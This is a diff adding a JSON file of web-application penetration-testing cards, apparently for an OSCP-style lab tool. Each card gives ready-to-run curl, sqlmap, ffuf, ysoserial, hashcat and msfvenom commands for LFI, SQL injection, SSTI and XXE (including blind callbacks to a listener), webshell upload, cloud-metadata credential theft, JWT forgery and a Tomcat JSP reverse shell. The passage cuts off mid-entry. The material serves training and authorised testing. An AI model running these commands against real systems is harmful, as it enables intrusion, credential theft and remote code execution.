@@ -1,0 +1,1113 @@
+{
+ "id": "web_2026_09",
+ "title": "Web Application",
+ "source": "Project-authored (obol-local). Common-knowledge web-application methodology; independent expression, not derived from any third-party card set.",
+ "license": "Project-authored data (obol-local). No third-party copyleft obligation.",
+ "actions": [
+  {
+   "id": "vhost-discovery",
+   "title": "Virtual Host Discovery",
+   "hypothesis": "A single IP frequently serves several applications, each one reachable only when the request carries the correct hostname via vhost routing. When the box has a domain name, sweep candidate values through the Host header and watch for a reply whose size differs from the baseline — that difference points to a site kept out of sight.",
+   "tool": "ffuf",
+   "tools": [
+    "ffuf",
+    "wfuzz"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable",
+    "port:80",
+    "port:443",
+    "port:8080",
+    "port:8443",
+    "web.server",
+    "web.tech"
+   ],
+   "produces": [
+    "web.vhost"
+   ],
+   "priority": 86,
+   "proves": "confirms a virtual host you have located",
+   "does_not_prove": "only newly found attack surface — not a vulnerability, a credential, or any access",
+   "report": {
+    "finding": "Hidden Virtual Host Discovered",
+    "severity": "low"
+   },
+   "refs": [
+    "https://github.com/OJ/gobuster",
+    "https://github.com/ffuf/ffuf"
+   ],
+   "commands": [
+    {
+     "tool": "ffuf",
+     "run": "ffuf -u http://{{target}} -H \"Host: FUZZ.{{domain}}\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302 -fs 0",
+     "note": "Use -fs to drop responses that match the default page size, leaving only genuine vhosts. Record any matches in /etc/hosts."
+    },
+    {
+     "tool": "wfuzz",
+     "run": "wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.{{domain}}\" --hh 0 http://{{target}}/",
+     "note": "A wfuzz-based alternative (a frequent 0xdf pick). Here --hh hides by character count rather than byte size, so baseline it against a bogus Host value first."
+    }
+   ]
+  },
+  {
+   "id": "content-discovery",
+   "title": "Content Discovery",
+   "hypothesis": "Sites serve far more than what their pages link to: admin consoles, backups, .git folders, API endpoints. Brute-forcing paths against the target with a solid wordlist surfaces this unlinked material, which is usually where the way in is found.",
+   "tool": "feroxbuster",
+   "tools": [
+    "feroxbuster",
+    "ffuf",
+    "gobuster"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "web.content_map"
+   ],
+   "priority": 90,
+   "proves": "produces a catalogue of the web content you have uncovered",
+   "does_not_prove": "only newly found attack surface — not a vulnerability, a credential, or any access",
+   "report": {
+    "finding": "Sensitive Paths Discovered via Content Discovery",
+    "severity": "low"
+   },
+   "refs": [
+    "https://github.com/epi052/feroxbuster",
+    "https://github.com/OJ/gobuster",
+    "https://github.com/ffuf/ffuf"
+   ],
+   "commands": [
+    {
+     "tool": "feroxbuster",
+     "run": "feroxbuster -u http://{{target}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o scans/ferox.txt",
+     "note": "Runs recursively with filtering. Keep an eye out for .git, backup file extensions, /admin, /api, /uploads."
+    },
+    {
+     "tool": "ffuf",
+     "run": "ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -of json -o scans/ffuf.json",
+     "note": "A lighter sweep; the JSON output imports neatly into the mentor drop folder."
+    },
+    {
+     "tool": "gobuster",
+     "run": "gobuster dir -u http://{{target}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -o scans/gobuster.txt",
+     "note": "The long-standing alternative (0xdf leaned on it for years before feroxbuster). -x tacks on extension fuzzing; use -k for invalid TLS certificates."
+    }
+   ]
+  },
+  {
+   "id": "lfi-probe",
+   "title": "Local File Inclusion Probe",
+   "hypothesis": "Parameters that pull in content by its name (page=, file=, include=) are prime LFI suspects. A traversal string settles it: when ../../../../etc/passwd hands back the passwd file, arbitrary local reads are possible — and that spirals into source disclosure, lifting credentials out of config files, and now and then RCE via log poisoning or wrappers.",
+   "tool": "curl",
+   "tools": [
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "web.parameterized",
+    "web.content_map"
+   ],
+   "produces": [
+    "web.lfi_confirmed"
+   ],
+   "priority": 60,
+   "proves": "confirms a working local file inclusion",
+   "does_not_prove": "merely a verified injection point — not code execution, data, or access until it is actually exploited",
+   "report": {
+    "finding": "Local File Inclusion",
+    "severity": "high"
+   },
+   "refs": [
+    "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s \"http://{{target}}/index.php?page=../../../../etc/passwd\"",
+     "note": "The opening traversal attempt. Scan the reply for root:x:0:0."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s \"http://{{target}}/index.php?page=....//....//....//etc/passwd\"",
+     "note": "A filter evasion: nesting the traversal sequences defeats simplistic ../ stripping."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s \"http://{{target}}/index.php?page=php://filter/convert.base64-encode/resource=index\"",
+     "note": "The PHP filter wrapper base64-encodes and returns any page's source. Decode it on your side to review the app source and lift credentials from configs."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "file-upload",
+   "title": "File Upload Abuse",
+   "hypothesis": "An upload form that accepts a script and stores it somewhere web-reachable is immediate RCE. Start by mapping what the form allows — extension blacklist versus whitelist, MIME inspection, content inspection. Then confirm the file was stored, confirm you can reach it, and only after that fire it off.",
+   "tool": "curl",
+   "tools": [
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "web.upload_form",
+    "http.reachable"
+   ],
+   "produces": [
+    "web.upload_confirmed",
+    "foothold.webshell"
+   ],
+   "priority": 80,
+   "proves": "confirms a working file upload and a web shell",
+   "does_not_prove": "execution within the web/application context only — not any elevated privilege",
+   "report": {
+    "finding": "Unrestricted File Upload Leading to Code Execution",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s -F \"file=@test.txt\" http://{{target}}/upload.php",
+     "note": "First check: will a harmless file go through? Read the response for clues about where it landed."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s -F \"file=@shell.php\" http://{{target}}/upload.php",
+     "note": "Attempt the straightforward path first. If it's refused: shell.php.jpg, shell.phtml, shell.php%00.png, or a Content-Type: image/png carrying a PHP body."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s http://{{target}}/uploads/shell.php?cmd=id",
+     "note": "Read it back: confirm the file can be reached and runs before doing anything further with it."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "sqli-basics",
+   "title": "SQL Injection Confirmation",
+   "hypothesis": "A parameter whose results shift the moment you add a quote is a SQLi candidate. Nail it down by hand with boolean or error-based signals — grasp the injection before turning to tooling, since exploiting blind cases requires knowing what the query looks like.",
+   "tool": "curl",
+   "tools": [
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "web.parameterized",
+    "web.content_map"
+   ],
+   "produces": [
+    "web.sqli_confirmed"
+   ],
+   "priority": 60,
+   "proves": "confirms a working SQL injection",
+   "does_not_prove": "merely a verified injection point — not code execution, data, or access until it is actually exploited",
+   "report": {
+    "finding": "SQL Injection",
+    "severity": "high"
+   },
+   "refs": [
+    "https://portswigger.net/web-security/sql-injection"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/page.php?id=1%27'",
+     "note": "A lone quote. A database error in the response is all but a confession."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/page.php?id=1%20AND%201=1--%20-'",
+     "note": "The boolean pair: 1=1 draws the page while 1=2 breaks it. That divergence proves boolean-based injection."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/page.php?id=1%20UNION%20SELECT%201,2,3--%20-'",
+     "note": "Hunt the column count by raising it until the error clears. Whichever numbers appear on the page are your output columns."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "sqlmap-automation",
+   "title": "SQLmap Exploitation (post-confirmation)",
+   "hypothesis": "Once you've verified SQLi by hand, sqlmap takes over the heavy lifting: dumping databases, executing OS commands, staging shells. WARNING: sqlmap is EXPLICITLY PROHIBITED on the OSCP exam — regard this card as lab-only. Under exam conditions everything it does must be performed by hand (see sqli-basics). Away from the exam, hand it a captured raw request so the auth cookies and parameters are exactly right.",
+   "tool": "sqlmap",
+   "tools": [
+    "sqlmap"
+   ],
+   "os": [],
+   "requires_all": [
+    "web.sqli_confirmed"
+   ],
+   "requires_any": [],
+   "produces": [
+    "db.creds",
+    "foothold.webshell"
+   ],
+   "priority": 80,
+   "proves": "confirms database credentials and a web shell",
+   "does_not_prove": "execution within the web/application context only — not any elevated privilege",
+   "report": {
+    "finding": "SQL Injection (Automated Exploitation)",
+    "severity": "high"
+   },
+   "refs": [
+    "https://sqlmap.org/",
+    "https://github.com/sqlmapproject/sqlmap"
+   ],
+   "commands": [
+    {
+     "tool": "sqlmap",
+     "run": "sqlmap -r {{file}} --batch --level=3 --risk=2",
+     "note": "Good practice: first write the raw request out of Burp or your browser to a file. --batch takes the defaults; only raise level and risk when you must."
+    },
+    {
+     "tool": "sqlmap",
+     "run": "sqlmap -r {{file}} --batch --dbs",
+     "note": "List the databases to start, then --tables -D <db>, then --dump -T <table> -D <db>. Working in stages keeps your evidence tidy."
+    },
+    {
+     "tool": "sqlmap",
+     "run": "sqlmap -r {{file}} --batch --os-shell",
+     "note": "Runs commands through the injection when the database account is privileged enough. Determine which account the DB runs under first."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "git-exposed",
+   "title": "Exposed .git Directory",
+   "hypothesis": "Sites deployed via git clone occasionally leave the entire .git directory in place. When /.git/HEAD can be read, the full source history is recoverable — credentials sitting in config files, secrets removed in later commits, and the complete application logic to study.",
+   "tool": "curl",
+   "tools": [
+    "curl",
+    "git-dumper"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "credential.candidate",
+    "web.source"
+   ],
+   "priority": 84,
+   "proves": "confirms candidate credentials and disclosed application source",
+   "does_not_prove": "unconfirmed leads only — neither a verified credential nor access",
+   "report": {
+    "finding": "Source Code Disclosure via Exposed .git",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/arthaud/git-dumper",
+    "https://github.com/internetwache/GitTools"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s http://{{target}}/.git/HEAD",
+     "note": "A reply of \"ref: refs/heads/...\" means the directory is exposed."
+    },
+    {
+     "tool": "git-dumper",
+     "run": "git-dumper http://{{target}}/.git/ gitloot",
+     "note": "Rebuilds the repository with no cooperation from a git server."
+    },
+    {
+     "tool": "sh",
+     "run": "cd gitloot && git log --oneline && git checkout . && grep -ri \"pass\\|key\\|secret\" .",
+     "note": "Restore the current state, then grep for secrets; also comb through prior commits with git log -p."
+    }
+   ]
+  },
+  {
+   "id": "svn-exposed",
+   "title": "Exposed .svn Directory",
+   "hypothesis": "Subversion's counterpart to an exposed .git: /.svn/ entries and pristine copies spill the whole working tree. Older codebases and legacy deployments still carry it. Also look for an SVN service on 3690 — anonymous checkout shows up often in labs.",
+   "tool": "curl",
+   "tools": [
+    "curl",
+    "svn"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable",
+    "port:3690"
+   ],
+   "produces": [
+    "web.source",
+    "credential.candidate"
+   ],
+   "priority": 83,
+   "proves": "confirms disclosed application source and candidate credentials",
+   "does_not_prove": "unconfirmed leads only — neither a verified credential nor access",
+   "report": {
+    "finding": "Source Code Disclosure via Exposed .svn",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/anantshri/svn-extractor"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s http://{{target}}/.svn/entries",
+     "note": "If entries come back (or a wc.db on more recent svn), the metadata is exposed."
+    },
+    {
+     "tool": "svn",
+     "run": "svn checkout svn://{{target}}/ repo",
+     "note": "Checks out an exposed svn service anonymously (port 3690)."
+    },
+    {
+     "tool": "sh",
+     "run": "svn log repo && svn diff -r 1:HEAD repo",
+     "note": "Trace the history for deleted secrets, just as git log -p does."
+    }
+   ]
+  },
+  {
+   "id": "ssrf",
+   "title": "Server-Side Request Forgery (SSRF)",
+   "hypothesis": "Whatever feature retrieves a URL for you (link previews, imports, webhooks, image-by-URL, XML parsing) doubles as a proxy for requests into the network sitting behind the server. In labs the usual reward is reading cloud metadata (169.254.169.254), reaching admin panels exposed only internally, or sweeping the internal network's ports through the app.",
+   "tool": "curl",
+   "tools": [
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "web.ssrf_confirmed",
+    "loot.files",
+    "cloud.aws_access"
+   ],
+   "priority": 66,
+   "proves": "confirms a working SSRF, retrieved files, and AWS cloud access",
+   "does_not_prove": "merely a verified injection point — not code execution, data, or access until it is actually exploited",
+   "report": {
+    "finding": "Server-Side Request Forgery",
+    "severity": "high"
+   },
+   "refs": [
+    "https://portswigger.net/web-security/ssrf"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/fetch?url=http://127.0.0.1/'",
+     "note": "Opening move: will it pull localhost? Point it at your listener IP as well — an inbound connection demonstrates the primitive."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/fetch?url=http://169.254.169.254/latest/meta-data/'",
+     "note": "Cloud metadata. iam/security-credentials/ yields AWS keys on EC2 (IMDSv1). For Azure use 169.254.169.254/metadata/instance?api-version=2021-02-01 alongside a Metadata:true header."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/fetch?url=http://127.0.0.1:8080/'",
+     "note": "Sweep internal ports: iterate over them and note shifts in response length. The services reachable only internally are the true target."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "ssti",
+   "title": "Server-Side Template Injection (SSTI)",
+   "hypothesis": "When user input passes through a template engine, {{7*7}} coming back as 49 shows the server is running template code — and template code leads to RCE. The 0xdf corpus runs into Jinja2, Twig, and ASP over and over. Spotting it is the same across engines, but exploiting it is engine-specific, so pin down the engine first (its template-error output usually names it).",
+   "tool": "curl",
+   "tools": [
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "web.ssti_confirmed",
+    "web.cmdi_confirmed"
+   ],
+   "priority": 80,
+   "proves": "confirms a web shell",
+   "does_not_prove": "execution within the web/application context only — not any elevated privilege",
+   "report": {
+    "finding": "Server-Side Template Injection (RCE)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/hello?user=\\{\\{7*7\\}\\}'",
+     "note": "Detection step: a 49 means SSTI. For other engines also try ${7*7}, <%= 7*7 %>, #{7*7}."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s --data-urlencode 'name=\\{\\{config\\}\\}' http://{{target}}/",
+     "note": "Jinja2: print the config (frequently exposes SECRET_KEY — see jwt-attacks)."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s --data-urlencode \"name=\\{\\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() \\}\\}\" http://{{target}}/",
+     "note": "A Jinja2 RCE chain through the context object. PayloadsAllTheThings carries chains for each engine (Twig, Freemarker, ASP <% %>)."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "xxe",
+   "title": "XML External Entity (XXE) Injection",
+   "hypothesis": "An endpoint that reads XML (uploads, APIs, SAML, docx/xlsx handlers) may resolve external entities — giving file reads, SSRF, and now and then RCE. Find the XML parsers by submitting content or switching Content-Type to application/xml and watching for parse errors.",
+   "tool": "curl",
+   "tools": [
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "loot.files",
+    "web.ssrf_confirmed"
+   ],
+   "priority": 66,
+   "proves": "confirms retrieved files and a working SSRF",
+   "does_not_prove": "merely a verified injection point — not code execution, data, or access until it is actually exploited",
+   "report": {
+    "finding": "XML External Entity Injection",
+    "severity": "high"
+   },
+   "refs": [
+    "https://portswigger.net/web-security/xxe"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s -X POST http://{{target}}/api -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>'",
+     "note": "The textbook file read. When entities are resolved, /etc/passwd appears in the response."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s -X POST http://{{target}}/api -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><r>&x;</r>'",
+     "note": "Against PHP: wrap the read in base64 so the source survives XML parsing."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s -X POST http://{{target}}/api -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{{lhost}}:{{lport}}/xxe\">]><r>&x;</r>'",
+     "note": "Blind XXE: seeing nothing returned? Watch your listener for the outbound hit, then step up to out-of-band exfiltration via an external DTD."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "deserialization",
+   "title": "Insecure Deserialization",
+   "hypothesis": "Serialized objects riding in cookies, ViewStates, or API bodies become execution primitives wherever the server trusts them blindly. Tell-tale markers: Java (rO0AB base64 / \\xac\\xed), .NET (__VIEWSTATE, /wEP), PHP (O:4:). Exploiting requires a gadget chain matching the libraries in play — ysoserial (Java), ysoserial.net (.NET), and phpggc (PHP) build them.",
+   "tool": "ysoserial",
+   "tools": [
+    "ysoserial",
+    "curl",
+    "java"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "foothold.webshell"
+   ],
+   "priority": 80,
+   "proves": "confirms a web shell",
+   "does_not_prove": "execution within the web/application context only — not any elevated privilege",
+   "report": {
+    "finding": "Insecure Deserialization (RCE)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://github.com/frohoff/ysoserial"
+   ],
+   "commands": [
+    {
+     "tool": "ysoserial",
+     "run": "ysoserial CommonsCollections5 'ping -c 3 {{lhost}}' | base64 -w0",
+     "note": "Java: build a gadget-chain payload. Fire a pingback at your listener to verify execution before staging anything larger — 0xdf does exactly this each time."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s -X POST http://{{target}}/api --data-binary 'payload=<base64-blob>'",
+     "note": "Send the payload through whichever parameter, cookie, or ViewState you pinpointed."
+    },
+    {
+     "tool": "sh",
+     "run": "java -jar ysoserial.jar | grep -i 'gadget\\|chain' | head -30",
+     "note": "Enumerate the available chains. Line the chain up with the libraries you can see in error messages, /WEB-INF dumps, or the app stack."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "jwt-attacks",
+   "title": "JWT Attacks",
+   "hypothesis": "A JSON Web Token is no stronger than its signing secret and the code that verifies it. The escalation ladder: (1) decode it and read the claims, (2) attempt alg:none, (3) crack weak HMAC secrets offline, (4) where you've obtained the app source (git-exposed, LFI), lift the hardcoded secret and mint admin tokens — the outcome 0xdf sees most often.",
+   "tool": "hashcat",
+   "tools": [
+    "hashcat",
+    "python3"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "web.jwt_secret",
+    "web.authz_bypass",
+    "credential.candidate"
+   ],
+   "priority": 82,
+   "proves": "confirms administrative access and a cleartext password",
+   "does_not_prove": "admin rights inside the application only — not an OS shell or system-level privilege unless proven on its own",
+   "report": {
+    "finding": "JWT Forgery via Weak/Leaked Secret",
+    "severity": "high"
+   },
+   "refs": [
+    "https://portswigger.net/web-security/jwt"
+   ],
+   "commands": [
+    {
+     "tool": "sh",
+     "run": "echo '{{token}}' | cut -d. -f2 | base64 -d 2>/dev/null",
+     "note": "Decode the payload to inspect its claims (user, role, admin markers). jwt.io does the same thing in a browser."
+    },
+    {
+     "tool": "hashcat",
+     "run": "hashcat -m 16500 {{hashfile}} {{wordlist}}",
+     "note": "Mode 16500 breaks HMAC secrets offline. Feeble secrets (secret, key, application names) give way all the time."
+    },
+    {
+     "tool": "sh",
+     "run": "python3 -c \"import jwt; print(jwt.encode({'user':'admin','role':'admin'}, '{{password}}', algorithm='HS256'))\"",
+     "note": "Craft a token using the cracked or leaked secret. PyJWT: pip install pyjwt."
+    },
+    {
+     "tool": "sh",
+     "run": "python3 -c \"import jwt; print(jwt.encode({'user':'admin'}, '', algorithm='none'))\"",
+     "note": "The alg:none variation — worth ten seconds on any JWT you come across."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "nosql-injection",
+   "title": "NoSQL Injection",
+   "hypothesis": "Logins backed by MongoDB will frequently accept operator objects in place of plain strings: user[$ne]=x&pass[$ne]=x signs you in as the first account (typically admin). And where equality holds but you still need the password, pulling it out with $regex leaks it one character at a time — the Mango approach.",
+   "tool": "curl",
+   "tools": [
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "access.admin",
+    "credential.plaintext"
+   ],
+   "priority": 82,
+   "proves": "confirms administrative access and a cleartext password",
+   "does_not_prove": "admin rights inside the application only — not an OS shell or system-level privilege unless proven on its own",
+   "report": {
+    "finding": "NoSQL Injection (Auth Bypass)",
+    "severity": "high"
+   },
+   "refs": [
+    "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s -X POST http://{{target}}/login -d 'user[$ne]=x&pass[$ne]=x'",
+     "note": "Auth bypass: match any account where user!=x and pass!=x. The JSON form is {\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}} with Content-Type: application/json."
+    },
+    {
+     "tool": "sh",
+     "run": "for c in a b c d; do curl -s -X POST http://{{target}}/login -d \"user=admin&pass[$regex]=^$c\" | grep -q success && echo $c; done",
+     "note": "A boolean oracle built on $regex: a match tells you the password begins with that character. Automate across the whole charset and step through it position by position."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "tomcat-deploy",
+   "title": "Tomcat Manager WAR Deploy",
+   "hypothesis": "Credentials for the Tomcat manager (defaults like tomcat:s3cret, tomcat:tomcat, admin:admin, or ones recovered from tomcat-users.xml via LFI) become RCE once you deploy a WAR webshell. It works through the HTML manager interface or the text API — and the text API scripts neatly with curl.",
+   "tool": "msfvenom",
+   "tools": [
+    "msfvenom",
+    "curl"
+   ],
+   "os": [
+    "linux",
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "foothold.webshell"
+   ],
+   "priority": 80,
+   "proves": "confirms a web shell",
+   "does_not_prove": "execution within the web/application context only — not any elevated privilege",
+   "report": {
+    "finding": "Tomcat Manager Authenticated RCE",
+    "severity": "critical"
+   },
+   "refs": [],
+   "commands": [
+    {
+     "tool": "msfvenom",
+     "run": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f war -o rev.war",
+     "note": "Assemble the WAR containing a JSP reverse shell."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -u '{{user}}:{{password}}' 'http://{{target}}:8080/manager/text/deploy?path=/shell' --upload-file rev.war",
+     "note": "Deploy over the text API (the 0xdf tabby technique). The /shell path then hosts your JSP."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s http://{{target}}:8080/shell/",
+     "note": "Set off the shell. Watch your listener."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "jenkins-access",
+   "title": "Jenkins Exploitation",
+   "hypothesis": "Jenkins (8080 out of the box) with any near-admin access is code execution: the Script Console runs Groovy as the Jenkins user, and a project build with a shell step does the same. Even instances with no authentication give up data — the CLI @file read flaw and anonymous job listings both turn up in the corpus.",
+   "tool": "curl",
+   "tools": [
+    "curl",
+    "java"
+   ],
+   "os": [
+    "linux",
+    "windows"
+   ],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "foothold.linux",
+    "foothold.windows",
+    "loot.files"
+   ],
+   "priority": 80,
+   "proves": "confirms a Linux foothold, a Windows foothold, and retrieved files",
+   "does_not_prove": "execution within the web/application context only — not any elevated privilege",
+   "report": {
+    "finding": "Jenkins Console Access (RCE)",
+    "severity": "critical"
+   },
+   "refs": [
+    "https://www.jenkins.io/doc/book/security/"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s http://{{target}}:8080/script",
+     "note": "Test for the Script Console (needs auth on hardened instances). In Groovy, println \"id\".execute().text runs commands."
+    },
+    {
+     "tool": "sh",
+     "run": "java -jar jenkins-cli.jar -s http://{{target}}:8080/ help @/etc/passwd",
+     "note": "A CVE-2024-23897-style CLI file read: the @filepath expansion exposes files (their leading lines) without authentication on affected versions."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s http://{{target}}:8080/asynchPeople/",
+     "note": "Lists users. Also hit /securityRealm/user/admin/api/json for anonymous disclosure of a user."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
+   "id": "wordpress",
+   "title": "WordPress Attack Surface",
+   "hypothesis": "WordPress calls for wpscan: enumerate the plugins, themes, and users, tie their versions to CVEs, then either exploit a flawed plugin or — should you land admin credentials — edit a theme file (Appearance → Editor) or upload a plugin zip to get the shell. XML-RPC (xmlrpc.php) offers an amplified channel for brute-forcing logins.",
+   "tool": "wpscan",
+   "tools": [
+    "wpscan",
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "web.users",
+    "exploit.candidate"
+   ],
+   "priority": 80,
+   "proves": "confirms a candidate exploit, a web shell, and enumerated application users",
+   "does_not_prove": "execution within the web/application context only — not any elevated privilege",
+   "report": {
+    "finding": "WordPress Vulnerable Component",
+    "severity": "high"
+   },
+   "refs": [
+    "https://wpscan.com/",
+    "https://github.com/wpscanteam/wpscan"
+   ],
+   "commands": [
+    {
+     "tool": "wpscan",
+     "run": "wpscan -e ap,t,tt,u --url http://{{target}} --api-token $WPSCAN_API",
+     "note": "Enumerate every plugin, theme, timthumb, and user. A no-cost API token from wpscan.com unlocks the vuln DB. The standard 0xdf scan."
+    },
+    {
+     "tool": "wpscan",
+     "run": "wpscan -e ap --plugins-detection aggressive --url http://{{target}}",
+     "note": "Aggressive plugin detection for when the passive pass turns up nothing — louder, but more thorough."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s http://{{target}}/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'",
+     "note": "If xmlrpc answers with a method list, wp.getUsersBlogs lets you test passwords in bulk."
+    }
+   ]
+  },
+  {
+   "id": "nikto-scan",
+   "title": "Web Server Vulnerability Scan (nikto)",
+   "hypothesis": "nikto probes for files known to be dangerous, stale server software, and the usual misconfigurations — catching what content discovery overlooks (default scripts, sample apps, hazardous HTTP methods). It is SLOW and VERY loud, so let it run in the background while you enumerate by hand, and treat each result as a lead to confirm rather than a verdict.",
+   "tool": "nikto",
+   "tools": [
+    "nikto"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "http.reachable"
+   ],
+   "produces": [
+    "exploit.candidate",
+    "web.content_map"
+   ],
+   "priority": 88,
+   "proves": "confirms a candidate exploit and a catalogue of uncovered web content",
+   "does_not_prove": "only newly found attack surface — not a vulnerability, a credential, or any access",
+   "report": {
+    "finding": "Web Server Misconfiguration (nikto)",
+    "severity": "low"
+   },
+   "refs": [
+    "https://github.com/sullo/nikto"
+   ],
+   "commands": [
+    {
+     "tool": "nikto",
+     "run": "nikto -h http://{{target}} -o scans/nikto.txt",
+     "note": "The standard scan. Kick it off, push it to the background, and keep working — it takes a while."
+    },
+    {
+     "tool": "nikto",
+     "run": "nikto -h https://{{target}} -ssl -o scans/nikto-ssl.txt",
+     "note": "For HTTPS targets add -ssl. Use -p to restrict the ports on multi-port scans."
+    },
+    {
+     "tool": "nikto",
+     "run": "nikto -h http://{{target}} -Tuning 123bde -o scans/nikto-interesting.txt",
+     "note": "Targeted tuning: drop the noise-only checks (x = reverse-lookup clutter and the like) while keeping the file, misconfig, and software checks."
+    }
+   ]
+  },
+  {
+   "id": "command-injection",
+   "title": "OS Command Injection",
+   "hypothesis": "A parameter that flows into a system call (ping forms, IP lookups, filename converters, PDF generators) can let you tack on your own commands. Verify with an innocuous probe, then enumerate with id/hostname, and only afterwards go for a shell. The separator makes all the difference: ; | && || a newline and $() each behave differently — and the output-hiding ones (|, &&) still run even when nothing appears (that's blind injection: demonstrate it with sleep).",
+   "tool": "curl",
+   "tools": [
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [],
+   "requires_any": [
+    "web.parameterized",
+    "http.reachable"
+   ],
+   "produces": [
+    "web.cmdi_confirmed",
+    "foothold.webshell"
+   ],
+   "priority": 80,
+   "proves": "confirms a working command injection and a web shell",
+   "does_not_prove": "execution within the web/application context only — not any elevated privilege",
+   "report": {
+    "finding": "OS Command Injection",
+    "severity": "critical"
+   },
+   "refs": [
